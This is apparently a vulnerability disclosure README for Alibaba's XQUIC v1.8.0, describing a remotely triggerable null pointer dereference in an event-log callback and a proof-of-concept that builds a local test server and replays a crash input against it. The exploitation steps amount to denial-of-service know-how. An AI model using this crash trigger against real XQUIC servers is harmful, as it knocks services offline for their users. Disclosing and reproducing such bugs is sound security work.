# Bug M10

## Product: XQUIC (Alibaba.inc)
### Github repository: [https://github.com/alibaba/xquic](https://github.com/alibaba/xquic)
### Affected version: [v1.8.0](https://github.com/alibaba/xquic/releases/tag/v1.8.0)
### Fixed version: N/A

### Bug summary:
A Null pointer dereference occurs and XQUIC server crashes, resulting in a Denial of Service attack.

### Bug details: 
An argument was set to an incorrect value(```NULL```) when calling ```xqc_log_TRA_PACKET_SENT_callback()```.

### Attack vector:
Remote attacker (on path) and the server is compiled with -DXQC_ENABLE_EVENT_LOG=1.

### Exploitation 
1) An attack send an Initial packet that filled 0x00 to all the header fields (expect the first byte) and carry PADDING frames.
2) This will trigger a Version Negotiation packet from the server. While the server is sending the packet, it calls a callback function, ```xquic/src/common/xqc_log_event_callback.c:xqc_log_TRA_PACKET_SENT_callback()``` with the incorrect arguments as shown below:
```
xqc_log_event(conn->log, TRA_PACKET_SENT, conn, packet_out, NULL, 0, sent, 0);
```
The fifth argument should not be ```NULL``` as it will later be dereferenced to get the path_id. This leads to a Null pointer dereference.

### PoC
Build the xquic test_server as described in the following (assumed you are in same directory as this README.md):
```bash
git clone https://github.com/alibaba/xquic.git
cp xquic_for_developers.patch xquic.crt xquic.key xquic
cd xquic

git clone https://github.com/google/boringssl.git ./third_party/boringssl
cd ./third_party/boringssl
mkdir -p build && cd build
cmake -DBUILD_SHARED_LIBS=0 -DCMAKE_C_FLAGS="-fPIC" -DCMAKE_CXX_FLAGS="-fPIC" ..
make ssl crypto
cd ..
export SSL_TYPE_STR="boringssl"
export SSL_PATH_STR="${PWD}"
cd ../..
git checkout 6803065
git submodule update --init --recursive
git apply xquic_for_developers.patch
mkdir -p build; cd build
cmake -DGCOV=on -DCMAKE_BUILD_TYPE=Debug -DXQC_ENABLE_TESTING=1 -DXQC_SUPPORT_SENDMMSG_BUILD=1 -DXQC_ENABLE_EVENT_LOG=1 -DXQC_ENABLE_BBR2=1 -DXQC_ENABLE_RENO=1 -DSSL_TYPE=${SSL_TYPE_STR} -DSSL_PATH=${SSL_PATH_STR} ..
make -j
cd ..

# start the server
./build/tests/test_server -a 127.0.0.1 -p 4433
```
Open another terminal, build the replay_crash program and run with the given crash input (assumed you are in same directory as this README.md):
```bash
cd ..
make
../replay_crash xquic_crash_bug3_small 4433
```